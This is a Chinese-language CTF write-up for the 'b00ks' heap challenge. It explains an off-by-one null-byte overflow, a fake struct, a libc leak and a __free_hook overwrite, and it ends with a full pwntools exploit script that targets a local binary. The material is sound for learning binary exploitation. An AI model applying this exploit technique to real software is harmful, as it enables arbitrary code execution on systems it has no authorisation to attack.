# b00ks

## 程序静态分析

### main函数

> 使用`ida`对程序进行分析，并根据提示目录，重命名相应的程序，理解程序的流程

<img src="https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-12-20_20-05-02.png"  />



> 整个流程如上图所示较为清晰，**具体的每个函数就不再进一步分析了**

### 漏洞函数 ----my_read

> 在程序`Change_author_name`函数中，为了进行输入，作者自己构建了一个输入函数，在分析时，个人通过`ida`重命令将其命令为`my_read`，如下图所示

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-12-20_20-28-54.png)



## 漏洞原理分析

### 需要注意的细节：

- 首先通过程序分析，得到`author_name`和`book`的**数组**，都分配在栈上，**不是堆**，`author_name`的长度为`0x20`字节，紧跟其后的地址空间存储着`book数组`，该数组指向对应`book`的结构体空间
- 分析`Create_a_book`可以知道，创建一本书，会一次创建其对应`name`空间和`description`空间，以及该`book`的结构体`book_struct`，该结构体存储着指向相应地址空间的指针 (下面的原理图，会有细节介绍)
- 在堆上分配内存空间时，当分配的空间小于`128k`就会使用`brk`函数，当分配空间大于`128k`就会使用`mmap`函数，在这里需要使用`mmap`函数，通过其可确定的偏移来得到`libc`基地址
- 在`C/C++`中，字符串以`\X00`结尾，表示字符的结束，若该字符被覆盖，就会一直向后读，直到对应的`\x00`数据
- 在创建`book1`时，其`description`的空间需要足够大，因为后期通过`Null byte `的溢出，会覆盖`book1`部分数据，使其指向一个低地址，我们的目的是使这个**指向的低地址位于`description`的空间**，所以若该空间过小，这可能难以满足条件





### 图示exp漏洞利用流程

> **需要注明，以下`图中所展示的堆结构只展示了数据这部分，其chunk头没有标出`，所以在计算偏移时需要自己注意**

- 首先运行程序，然后是创建了两本书，结构如下图所示，**下图中，`book2`的`description`分配的较大，与现有的空间地址并不连续，所以没有画出，在图中已标出**，在创建该结构的过程中，我们已经通过`my_read`函数向`author_name`空间写入了32个`A`字符，根据前面的预备知识可知，该字符串需要`\x00`结尾，位于`book1`中，但是当我们创建`b00k1`,该内存空间被填充，`\x00`字符被覆盖，此时通过`print_a_book`选项输出`author_name`会将`book1`中的数据一起输出，这样我们就**得到`book1`的数据**

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-12-20_20-40-08.png)

- 由上图可知`book1`指向`book1_struct_1`,其间隔一个`struct`和一个`name`的空间即为`book_struct_2`，所以如果得到`book1`存储的数据，我们可以对应计算出`book_struct_2`的`name_ptr`和`description_ptr`的地址对应偏移为`0x68`,`0x70`(**图中仅展示了`chunk`的数据部分，计算偏移时需要考虑`chunk`头的大小**。首先是`book_strcut_1`大小为`0x20`,其次由于我`book2`的`name`的`size =0x20`即`chunk`的数据部分大小为`0x20`整个`name`的`chunk`为`0x30`，再然后`book_struct_2`的`chunk`头部为`0x10`所以**到`id`字段的偏移为`0x60`**,**0x60 = 0x20+0x30+0x10**,)
- 通过`book1`计算得到相应的地址后，我们将在`book1`的对应地址构建一个`fake_book1_struct`,并填充对应内容。使其指向`book_struct_2`的对应位置，如下图红色肩头所示所示：

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-12-20_21-33-37.png)





- 通过向`author_name`写入32个字符，由于调用`my_read`函数，会发生越界，最后一个`\x00`数据会写入到`book`数组中`book1`的空间,导致`book1`部分数据被覆盖，从而指向`description`空间，如下图所示，**红线标注出`book1`指向地址改变，其中`book1`指向的地址和`description`开始的地址可能存在一定的位移偏差`offset`，需要根据自己的情况调试得到；当`book1`指向`description`区域时他就会将对应的空间数据解析为`book1`的结构体，即`fake_book1_struct`**

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-12-20_21-36-01.png)

- 通过打印`book1`的`description`得到了`book2`的`description_ptr`存储的数据，即`description`的起始地址，从而根据偏移计算出`libc`的地址，得到`libc`以后，便可根据偏移得到`__free_hook`和`execve`等函数的地址，通过编辑`book1`使`book2`的`description_ptr`指向`__free_hook`,然后通过编辑`book2`再使`__free_hook`指向`exevce`函数，构成利用链，如下图所示

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-12-20_21-43-43.png)



## EXP

**Attention:  该`exp`由于某些参数需要动态调试获得，只适用于本地环境**

```python
from pwn import *


context(os ="linux",arch= "amd64",log_level = "debug")
io = process("/home/always/PWN/b00ks")
libc = ELF("/home/always/Libc/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")

def createbook(name_size, name, des_size, des):
    io.readuntil("> ")
    io.sendline("1")
    io.readuntil(": ")
    io.sendline(str(name_size))
    io.readuntil(": ")
    io.sendline(name)
    io.readuntil(": ")
    io.sendline(str(des_size))
    io.readuntil(": ")
    io.sendline(des)

def printbook(id):
    io.readuntil("> ")
    io.sendline("4")
    io.readuntil(": ")
    for i in range(id):
        book_id = int(io.readline()[:-1])
        io.readuntil(": ")
        book_name = io.readline()[:-1]
        io.readuntil(": ")
        book_des = io.readline()[:-1]
        io.readuntil(": ")
        book_author = io.readline()[:-1]
    return book_id, book_name, book_des, book_author

def createname(name):
    io.readuntil("name: ")
    io.sendline(name)

def changename(name):
    io.readuntil("> ")
    io.sendline("5")
    io.readuntil(": ")
    io.sendline(name)

def editbook(book_id, new_des):
    io.readuntil("> ")
    io.sendline("3")
    io.readuntil(": ")
    io.writeline(str(book_id))
    io.readuntil(": ")
    io.sendline(new_des)

def deletebook(book_id):
    io.readuntil("> ")
    io.sendline("2")
    io.readuntil(": ")
    io.sendline(str(book_id))


createname("A" * 32)
createbook(5, "hello", 256, "a")
createbook(0x20, "aaaa", 0x21000, "bbbb")

book_id_1, book_name, book_des, book_author = printbook(1)
#--------leak book1_struct_addr--------------------
book1_addr = u64(book_author[32:32+6].ljust(8,b"\x00"))
log.success("book1_address:" + hex(book1_addr))
#---------------------------------------change the book_ptr and fake a book struct---------------
payload = b'A'*0xc0 + p64(1) + p64(book1_addr + 0x68) + p64(book1_addr + 0x70) + p64(0xffff)
editbook(book_id_1, payload)
changename("A" * 32)
#---------------------------------------leak the libc base ------------------------
book_id_1, book_name, book_des, book_author = printbook(1)
book2_name_addr = u64(book_name.ljust(8,b"\x00"))
book2_des_addr = u64(book_des.ljust(8,b"\x00"))
log.success("book2 name addr:" + hex(book2_name_addr))
log.success("book2 des addr:" + hex(book2_des_addr))

libc_base = book2_des_addr - 0x5ca010               #need to change 
log.success("libc base:" + hex(libc_base))
#gdb.attach(io)            #-------debug
#pause()
#-------------------------------------
free_hook = libc_base + libc.symbols["__free_hook"]
one_gadget = libc_base + 0x4527a    #need to change according situation 
log.success("free_hook:" + hex(free_hook))
log.success("one_gadget:" + hex(one_gadget))
editbook(1, p64(free_hook) )
editbook(2, p64(one_gadget))

deletebook(2)
#gdb.attach(io)            #-------debug
#pause()

io.interactive()
```

